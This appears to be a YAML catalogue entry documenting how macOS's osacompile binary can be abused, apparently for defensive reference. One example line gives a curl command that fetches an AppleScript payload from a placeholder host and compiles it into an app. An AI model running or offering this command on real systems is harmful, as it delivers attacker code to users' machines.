...
execution:
  ...
  shell: false
examples:
- description: 'Download and compile a payload: The following command downloads an
    applescript payload from getpayload.com and compiles it into an app.'
  command: curl https://getpayload.com/payload_code.apple_script && osacompile -x
    -e payload_code.apple_script -o payload.app
install:
- method: custom
  commands:
  - /usr/bin/osacompile
...
references:
- label: 'A bundle of nerves: Tweaking macOS security controls to thwart application
    bundle manipulation'
